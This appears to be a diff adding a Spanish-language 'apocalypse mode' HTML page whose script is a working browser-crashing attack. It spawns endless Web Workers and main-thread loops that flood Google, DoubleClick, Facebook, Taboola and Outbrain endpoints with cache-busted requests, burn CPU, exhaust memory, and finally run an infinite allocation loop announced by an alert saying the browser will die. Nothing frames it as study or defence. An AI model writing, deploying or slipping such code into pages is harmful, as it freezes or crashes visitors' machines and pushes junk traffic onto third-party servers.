@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>☢ ULTIMA VERSION ☢</title>
+<style>
+body{
+  margin:0;
+  background:black;
+  color:#ff0000;
+  font-family:monospace;
+  overflow:hidden;
+  text-align:center;
+}
+h1{
+  margin-top:80px;
+  font-size:5.5rem;
+  animation: blink 0.15s infinite;
+  text-shadow: 0 0 50px red;
+}
+#contador{
+  font-size:3.2rem;
+  margin:30px;
+  color:#ff0000;
+}
+</style>
+</head>
+<body>
+<h1>☢ MODO APOCALIPSIS ACTIVADO ☢</h1>
+<div id="contador">Destrucción: 0%</div>
+
+<script>
+// Recursos
+const resources = [
+  "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
+  "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
+  "https://connect.facebook.net/en_US/fbevents.js",
+  "https://googleads.g.doubleclick.net/pagead/ads",
+  "https://cdn.taboola.com/lib/native.js",
+  "https://widgets.outbrain.com/outbrain.js"
+];
+
+let total = 0;
+let running = true;
+
+// === MÁXIMA DESTRUCCIÓN ===
+
+// 1. Web Workers masivos
+function createHellWorker() {
+  const workerCode = `
+    self.onmessage = function() {
+      while(true) {
+        for(let i = 0; i < 25; i++) {
+          fetch("${resources[Math.floor(Math.random()*resources.length)]}?t=" + Date.now() + Math.random(), 
+          {mode: "no-cors", cache: "no-store"}).catch(()=>{});
+        }
+        // Cálculo pesado para quemar CPU
+        let x = 0;
+        for(let j = 0; j < 300000; j++) x += Math.sin(j) * Math.random();
+      }
+    };
+  `;
+  try {
+    const blob = new Blob([workerCode], {type: "application/javascript"});
+    const worker = new Worker(URL.createObjectURL(blob));
+    worker.postMessage("");
+  } catch(e) {}
+}
+
+// 2. Spam en hilo principal ultra agresivo
+function chaosSpam() {
+  if (!running) return;
+
+  const url = resources[Math.floor(Math.random() * resources.length)];
+  const cb = "?t=" + Date.now() + Math.random();
+
+  for(let i = 0; i < 12; i++) {
+    fetch(url + cb, {mode: 'no-cors', cache: 'no-store'}).catch(() => {});
+    
+    const img = new Image();
+    img.src = url + cb;
+  }
+
+  // Cálculo pesado
+  let trash = [];
+  for(let i = 0; i < 15000; i++) {
+    trash.push(new Array(100).fill(Math.random()));
+  }
+
+  total += 30;
+  document.getElementById("contador").innerText = `Destrucción: ${Math.min(100, Math.floor(total/80))}%`;
+
+  setTimeout(chaosSpam, 0);
+}
+
+// 3. Crear muchos workers + canvases
+for(let i = 0; i < 14; i++) {
+  createHellWorker();
+}
+
+// Ráfaga inicial extrema
+for(let i = 0; i < 400; i++) {
+  setTimeout(chaosSpam, i * 1.5);
+}
+
+chaosSpam();
+
+// === INTENTO DE CRASH EXTRA ===
+setTimeout(() => {
+  while(true) {
+    let a = new Array(1000000).fill(Math.random());
+    console.log(a);
+  }
+}, 2500);
+
+alert("🚨 El navegador va a morir. Buena suerte.");
+</script>
+</body>
+</html>
